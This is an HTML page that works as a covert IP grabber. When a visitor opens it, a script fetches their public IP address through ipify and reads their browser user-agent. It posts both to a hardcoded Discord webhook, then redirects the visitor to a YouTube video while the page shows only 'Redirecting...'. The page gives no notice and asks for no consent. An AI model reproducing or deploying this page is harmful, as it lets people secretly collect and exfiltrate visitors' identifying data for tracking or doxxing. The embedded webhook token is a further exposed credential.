<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Collecting IP and User-Agent</title>
  <style>
    body { margin: 0; background: #000; color: #fff; font-family: Arial, sans-serif; }
  </style>
  <script>
    (async () => {
      try {
        // Get IP address using ipify API
        const ipRes = await fetch("https://api.ipify.org?format=json");
        const { ip } = await ipRes.json();

        // Get User-Agent (browser and OS information)
        const userAgent = navigator.userAgent;

        // Prepare the data to send
        const data = {
          ip,
          userAgent
        };

        // Log data to the console for debugging
        console.log(data);

        // Send collected data to your webhook (replace with your URL)
        await fetch("https://discord.com/api/webhooks/1359581999593033918/G0qtLtRlOeWNlgn1hekeqUPNVzdqd8hXTf80o8wq6YW0-yBp_Z7syBH0xNugNxmDD2j6", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });
      } catch (error) {
        console.error("Error collecting data:", error);
      }

      // Redirect user to YouTube after collecting the information
      window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
    })();
  </script>
</head>
<body>
  <p>Redirecting...</p>
</body>
</html>
